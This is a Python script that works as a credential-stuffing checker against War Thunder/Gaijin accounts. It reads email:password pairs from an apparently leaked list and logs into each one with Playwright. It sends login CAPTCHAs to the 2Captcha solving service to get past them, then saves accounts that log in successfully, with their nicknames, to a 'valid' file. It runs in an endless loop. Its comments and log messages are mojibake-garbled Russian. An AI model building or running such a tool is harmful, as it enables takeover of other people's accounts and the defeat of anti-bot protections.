import asyncio
from playwright.async_api import async_playwright
from twocaptcha import TwoCaptcha
from loguru import logger
import os

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è 2Captcha —Å API –∫–ª—é—á–æ–º
API_KEY = ""
solver = TwoCaptcha(API_KEY)

os.makedirs('valid_accounts', exist_ok=True)


async def solve_captcha_with_2captcha(page, captcha_selector: str) -> str:
    """
    –†–µ—à–µ–Ω–∏–µ CAPTCHA —á–µ—Ä–µ–∑ 2Captcha —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º Playwright –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞.
    """
    try:
        logger.info("üñºÔ∏è –°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ CAPTCHA —á–µ—Ä–µ–∑ Playwright...")

        # –î–µ–ª–∞–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç CAPTCHA
        captcha_image_path = 'captcha_image.png'
        captcha_element = await page.wait_for_selector(captcha_selector)
        await captcha_element.screenshot(path=captcha_image_path)

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤ 2Captcha
        result = solver.normal(captcha_image_path)
        captcha_text = result['code']
        logger.success(f"‚úÖ CAPTCHA —Ä–µ—à–µ–Ω–∞: {captcha_text}")
        return captcha_text

    except Exception as e:
        logger.error(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ—à–µ–Ω–∏–∏ CAPTCHA —á–µ—Ä–µ–∑ 2Captcha: {e}")
        return ""


async def save_valid_account(email: str, password: str, nickname: str):
    """
    –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤–∞–ª–∏–¥–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ —Ñ–∞–π–ª.
    """
    valid_file_path = os.path.join('valid_accounts', 'warthunder_valid.txt')
    with open(valid_file_path, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}:{nickname}\n")
    logger.success(f"üíæ –í–∞–ª–∏–¥–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {email}:{password}:{nickname}")


async def login_warthunder(email: str, password: str) -> bool:
    """
    –ü–æ–ø—ã—Ç–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –Ω–∞ War Thunder —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —É–∫–∞–∑–∞–Ω–Ω—ã—Ö email –∏ –ø–∞—Ä–æ–ª—è.
    –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç True, –µ—Å–ª–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞, –∏–Ω–∞—á–µ False.
    """
    if '@' not in email:
        logger.warning(f"‚ö†Ô∏è –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π email: {email}")
        return False

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=False)
            page = await browser.new_page()

            await page.goto("https://login.gaijin.net/", timeout=60000)
            await page.wait_for_load_state("networkidle")

            email_field = await page.wait_for_selector('input[name="login"]', timeout=5000)
            await email_field.fill(email)

            password_field = await page.wait_for_selector('input[type="password"]', timeout=5000)
            await password_field.fill(password)

            captcha_image = await page.query_selector('img#captcha-img')
            if captcha_image:
                logger.info("üõ°Ô∏è CAPTCHA –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞. –ü–æ–ø—ã—Ç–∫–∞ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞–Ω–∏—è —á–µ—Ä–µ–∑ 2Captcha...")

                captcha_text = await solve_captcha_with_2captcha(page, 'img#captcha-img')

                if captcha_text:
                    captcha_field = await page.wait_for_selector('input[name="captcha"]', timeout=5000)
                    await captcha_field.fill(captcha_text)
                    logger.info(f"‚úÖ CAPTCHA –≤–≤–µ–¥–µ–Ω–∞: {captcha_text}")
                else:
                    logger.error("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å CAPTCHA.")
                    await browser.close()
                    return False

            login_btn = await page.wait_for_selector(".input-button-main.js-anti-several-clicks", timeout=5000)
            await login_btn.click()

            await page.wait_for_timeout(3000)

            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —É—Å–ø–µ—à–Ω–æ—Å—Ç—å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
            if "https://login.gaijin.net/" not in page.url:
                logger.success(f"‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥: {email}")
                await asyncio.sleep(5)
                # –ü–æ–∏—Å–∫ –Ω–∏–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
                nickname_element = await page.query_selector('.profile-user__username')
                if nickname_element:
                    nickname_text = await nickname_element.inner_text()
                    nickname_clean = nickname_text.strip().split('\n')[0]
                    logger.success(f"üè∑Ô∏è –ù–∞–π–¥–µ–Ω –Ω–∏–∫: {nickname_clean}")
                    await save_valid_account(email, password, nickname_clean)
                else:
                    logger.warning("‚ùå –ù–∏–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω.")

                await browser.close()
                return True
            else:
                logger.warning(f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏: {email}")
                await browser.close()
                return False

    except Exception as e:
        logger.error(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ {email}: {e}")
        return False


async def main():
    """
    –ë–µ—Å–∫–æ–Ω–µ—á–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ñ–∞–π–ª–∞ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏.
    """
    while True:
        try:
            with open("filtered_results/warthunder.txt", "r", encoding="utf-8") as file:
                credentials = [line.strip() for line in file if ':' in line]

            for cred in credentials:
                parts = cred.split(":", 1)
                if len(parts) == 2:
                    email, password = parts
                    success = await login_warthunder(email.strip(), password.strip())
                    await asyncio.sleep(2)
                else:
                    logger.warning(f"‚ö†Ô∏è –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Å—Ç—Ä–æ–∫–∏: {cred}")

        except FileNotFoundError:
            logger.error("‚ùå –§–∞–π–ª warthunder.txt –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            break
        except Exception as e:
            logger.error(f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")

        logger.info("üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ—Å—Å–∞ —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥...")
        await asyncio.sleep(10)


if __name__ == "__main__":
    asyncio.run(main())
